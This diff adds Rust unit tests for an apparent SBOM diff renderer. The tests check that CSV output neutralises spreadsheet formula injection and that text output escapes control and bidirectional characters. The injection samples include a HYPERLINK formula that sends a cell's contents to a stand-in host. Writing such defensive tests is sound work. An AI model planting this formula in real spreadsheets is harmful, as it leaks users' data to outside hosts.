@@ -2046,3 +2046,131 @@ fn test_markdown_warnings_cannot_inject_html() {
     assert!(render_markdown(&mock_diff(), &opts).contains(line));
     assert!(render_markdown_summary(&mock_diff(), &opts).contains(line));
 }
+
+fn mock_diff_every_value(v: &str) -> (Diff, RenderOptions) {
+    use sbom_model::{ComponentId, DependencyKind};
+
+    let component = |name: &str| {
+        let mut c = Component::new(name.into(), Some(v.into()));
+        c.purl = Some(format!("{v}{name}"));
+        c.ecosystem = Some(v.into());
+        c
+    };
+    let id = |name: &str| ComponentId::new(None, &[("name", name)]);
+    let changed = component("c");
+    let diff = Diff {
+        added: vec![component("a")],
+        removed: vec![component("r")],
+        changed: vec![ComponentChange {
+            id: changed.id.clone(),
+            old: changed.clone(),
+            new: changed,
+            changes: vec![
+                FieldChange::Description(Some(v.into()), Some(v.into())),
+                FieldChange::Hashes(
+                    BTreeMap::from([(format!("{v}c"), v.into()), (format!("{v}r"), v.into())]),
+                    BTreeMap::from([
+                        (format!("{v}a"), v.into()),
+                        (format!("{v}c"), format!("{v}2")),
+                    ]),
+                ),
+            ],
+            is_downgrade: false,
+        }],
+        edge_diffs: vec![crate::EdgeDiff {
+            parent: id("p"),
+            added: BTreeMap::from([(id("ea"), DependencyKind::Dev)]),
+            removed: BTreeMap::from([(id("er"), DependencyKind::Runtime)]),
+            kind_changed: BTreeMap::from([(
+                id("ek"),
+                (DependencyKind::Runtime, DependencyKind::Dev),
+            )]),
+        }],
+        metadata_changed: Some(crate::MetadataChange {
+            timestamp: Some((Some(v.into()), Some(v.into()))),
+            tools: Some((vec![v.into()], vec![v.into()])),
+            authors: Some((vec![v.into()], vec![v.into()])),
+        }),
+        component_names: ["p", "ea", "er", "ek"]
+            .into_iter()
+            .map(|n| (id(n), format!("{v}{n}")))
+            .collect(),
+        ..Diff::default()
+    };
+    let opts = RenderOptions {
+        group_by_ecosystem: true,
+        show_warnings: true,
+        old_warnings: vec![v.into()],
+        new_warnings: vec![v.into()],
+    };
+    (diff, opts)
+}
+
+#[test]
+fn test_csv_prefixes_cells_a_spreadsheet_reads_as_formulas() {
+    let render = |v: &str| {
+        let (diff, opts) = mock_diff_every_value(v);
+        let mut out = Vec::new();
+        CsvRenderer.render(&diff, &opts, &mut out).unwrap();
+        CsvRenderer.render_summary(&diff, &opts, &mut out).unwrap();
+        csv_parse(&out)
+    };
+    let clean = render("VALUE");
+
+    for v in [
+        "=HYPERLINK(\"http://example.invalid/?d=\"&A1,\"click\")",
+        "+1",
+        "-1",
+        "@SUM(A1)",
+        "\t=1",
+        "\r=1",
+    ] {
+        let expected: Vec<Vec<String>> = clean
+            .iter()
+            .map(|row| {
+                row.iter()
+                    .map(|cell| match cell.strip_prefix("VALUE") {
+                        Some(_) => format!("'{}", cell.replace("VALUE", v)),
+                        None => cell.replace("VALUE", v),
+                    })
+                    .collect()
+            })
+            .collect();
+        assert_eq!(render(v), expected, "{v:?}");
+    }
+}
+
+#[test]
+fn test_text_escapes_control_characters_in_values() {
+    let render = |v: &str| {
+        let (diff, opts) = mock_diff_every_value(v);
+        let mut out = Vec::new();
+        TextRenderer.render(&diff, &opts, &mut out).unwrap();
+        TextRenderer.render_summary(&diff, &opts, &mut out).unwrap();
+        String::from_utf8(out).unwrap()
+    };
+    let clean = render("VALUE");
+
+    for (c, escape) in [
+        ("\n", "\\n"),
+        ("\r", "\\r"),
+        ("\t", "\\t"),
+        ("\0", "\\u{0}"),
+        ("\x1b", "\\u{1b}"),
+        ("\x1f", "\\u{1f}"),
+        ("\x7f", "\\u{7f}"),
+        ("\u{80}", "\\u{80}"),
+        ("\u{9b}", "\\u{9b}"),
+        ("\u{9f}", "\\u{9f}"),
+        ("\u{202a}", "\\u{202a}"),
+        ("\u{202e}", "\\u{202e}"),
+        ("\u{2066}", "\\u{2066}"),
+        ("\u{2069}", "\\u{2069}"),
+        ("\u{61c}", "\\u{61c}"),
+        ("\u{200e}", "\\u{200e}"),
+        ("\u{200f}", "\\u{200f}"),
+    ] {
+        let expected = clean.replace("VALUE", &format!("a{escape}b"));
+        assert_eq!(render(&format!("a{c}b")), expected, "{c:?}");
+    }
+}
